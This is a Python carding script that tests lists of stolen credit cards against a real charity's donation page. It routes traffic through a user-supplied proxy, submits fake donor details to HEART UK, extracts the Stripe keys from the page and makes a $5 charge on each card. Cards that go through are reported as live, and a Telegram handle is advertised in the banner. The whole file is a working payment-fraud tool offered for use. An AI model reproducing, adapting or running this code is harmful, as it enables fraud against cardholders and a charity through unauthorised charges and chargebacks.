import requests,os,random
os.system('clear')
E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33m'
print(f'''{B}{E}=============================={B}
|{G}[+] TeleGram  : {B}UQ_9W  |
{E}==============================''')
card=input(f"{G}[+] Proxy ==> {S}")
lst=input(f"{G}[+] CC List Name ==> {S}")
print(f'{E}==============================')
proxies1=card
proxies = {'https': f'socks5://{proxies1}','https': f'socks4://{proxies1}','https': f'http://{proxies1}'}
use='1234567890qwertyuioplkjhgfdsazxcvbnm'
us=str("".join(random.choice(use)for i in range(6)))
head1={
    "Host": "www.heartuk.org.uk",
    "Connection": "keep-alive",
    "Content-Length": "362",
    "Cache-Control": "max-age\u003d0",
    "sec-ch-ua": "\" Not A;Brand\";v\u003d\"99\", \"Chromium\";v\u003d\"99\", \"Google Chrome\";v\u003d\"99\"",
    "sec-ch-ua-mobile": "?1",
    "sec-ch-ua-platform": "\"Android\"",
    "Upgrade-Insecure-Requests": "1",
    "Origin": "https://www.heartuk.org.uk",
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Linux; Android 8.0.0; Plume L2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q\u003d0.9,image/avif,image/webp,image/apng,*/*;q\u003d0.8,application/signed-exchange;v\u003db3;q\u003d0.9",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-User": "?1",
    "Sec-Fetch-Dest": "document",
    "Referer": "https://www.heartuk.org.uk/donate/single-donation/submit",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q\u003d0.9,ar-DZ;q\u003d0.8,ar;q\u003d0.7",
    "Cookie": f"_gid=GA1.3.2033017220.1682044366; _clck=1r7gm0w|1|fay|0; accept_cookies=0; __stripe_mid=a49e5e2f-3e30-4948-908c-cfccead61113dce6c1; __stripe_sid=29fb8d83-4585-4cd2-abac-6c66cb34804286781d; PHPSESSID=9daae4aab695a36d8ee1e2ea9ff22f72; _gat=1; __atuvc=6%7C16; __atuvs=644200ba8d076174003; _ga=GA1.1.1492434873.1682044366; _clsk=14zm2ym|1682047741406|4|1|q.clarity.ms/collect; _ga_WC46K8CHWV=GS1.1.1682047165.2.1.1682047756.0.0.0"}
data1=f'amount=other&otheramount=5&giftaid=1&title=Mr&title_other_value=&firstname={us}&lastname={us}&country=United+States&postcode=10080&address1=California&address2=California&town=Los+Angeles&county=New+York&telephone=01213771511&email={us}%40gmail.com&contact_pref_1=1&contact_pref_2=1&contact_pref_3=1&contact_pref_4=1&donation_submit=Next+step'
res1=requests.post('https://www.heartuk.org.uk/donate/single-donation/submit',data=data1,headers=head1,proxies=proxies).text
try:
   pk=res1.split('	var stripe = Stripe("')[1].split('"')[0]
   pi=res1.split('stripe.handleCardPayment(\n					"')[1].split('"')[0]
   print(pk)
   print(pi)
except:
   exit('[×] Change Proxy')
head2={
    "Host": "api.stripe.com",
    "content-length": "713",
    "sec-ch-ua": "\" Not A;Brand\";v\u003d\"99\", \"Chromium\";v\u003d\"99\", \"Google Chrome\";v\u003d\"99\"",
    "accept": "application/json",
    "content-type": "application/x-www-form-urlencoded",
    "sec-ch-ua-mobile": "?1",
    "user-agent": "Mozilla/5.0 (Linux; Android 8.0.0; Plume L2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36",
    "sec-ch-ua-platform": "\"Android\"",
    "origin": "https://js.stripe.com",
    "sec-fetch-site": "same-site",
    "sec-fetch-mode": "cors",
    "sec-fetch-dest": "empty",
    "referer": "https://js.stripe.com/",
    "accept-encoding": "gzip, deflate, br",
    "accept-language": "en-US,en;q\u003d0.9,ar-DZ;q\u003d0.8,ar;q\u003d0.7"}
err=0
for whis in open(lst,'r').read().splitlines():
  card=str(whis)
  cc=card.split('\n')[0]
  ccc=cc.split('|')[0]
  cvc=cc.split('|')[3].split('|')[0]
  em=cc.split('|')[1].split('|')[0]
  ey=cc.split('|')[2].split('|')[0]
  if len(ey)==4:
   ey=ey.replace('20','')
  data2=f'payment_method_data[type]=card&payment_method_data[billing_details][name]={us}+{us}&payment_method_data[billing_details][email]={us}%40gmail.com&payment_method_data[card][number]={ccc}&payment_method_data[card][cvc]={cvc}&payment_method_data[card][exp_month]={em}&payment_method_data[card][exp_year]={ey}&payment_method_data[guid]=NA&payment_method_data[muid]=NA&payment_method_data[sid]=NA&payment_method_data[payment_user_agent]=stripe.js%2F6aa5f07608%3B+stripe-js-v3%2F6aa5f07608&payment_method_data[time_on_page]=33677&expected_payment_method_type=card&use_stripe_sdk=true&key={pk}&client_secret={pi}'
  pi2=pi.split('_secret')[0]
  res2=requests.post(f'https://api.stripe.com/v1/payment_intents/{pi2}/confirm',data=data2,headers=head2).json()
  try:
   sc=res2['client_secret']
   msg=f'''=======CARD=======
[√] Card : {cc}
[√] Charged : 5$
==================='''
   print(f'{G}{msg}')
   head3={
    "Host": "api.stripe.com",
    "sec-ch-ua": "\" Not A;Brand\";v\u003d\"99\", \"Chromium\";v\u003d\"99\", \"Google Chrome\";v\u003d\"99\"",
    "accept": "application/json",
    "content-type": "application/x-www-form-urlencoded",
    "sec-ch-ua-mobile": "?1",
    "user-agent": "Mozilla/5.0 (Linux; Android 8.0.0; Plume L2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36",
    "sec-ch-ua-platform": "\"Android\"",
    "origin": "https://js.stripe.com",
    "sec-fetch-site": "same-site",
    "sec-fetch-mode": "cors",
    "sec-fetch-dest": "empty",
    "referer": "https://js.stripe.com/",
    "accept-encoding": "gzip, deflate, br",
    "accept-language": "en-US,en;q\u003d0.9,ar-DZ;q\u003d0.8,ar;q\u003d0.7"}
   whisperurl,=f'https://api.stripe.com/v1/payment_intents/{pi2}?key={pk}&is_stripe_sdk=false&client_secret={pi}'
   res3=requests.get(whisperurl,headers=head3).json()
   try:
    error=res3['last_payment_error']['message']
    err+=1
    print(f'{E}[{err}] {ccc}|{em}|{ey}|{cvc} : {S}{error} (2)')
   except:
    try:
     amnt=int(res3['amount'])/100
     msg=f'''=======CARD=======
[√] Card : {cc}
[√] Charged : 5$
==================='''
     print(f'{G}{msg}')
    except:
     err+=1
     print(f'{E}[{err}] {ccc}|{em}|{ey}|{cvc} : {S}Your card was declined. (3)')
  except:
   err+=1
   error=res2['error']['message']
   if error == 'Your card does not support this type of purchase.':
    msg=f'''=======CARD=======
[√] Card : {cc}
[√] Charged : 5$
==================='''
    print(f'{G}{msg}')
   else:
    print(f'{E}[{err}] {ccc}|{em}|{ey}|{cvc} : {S}{error} (1)')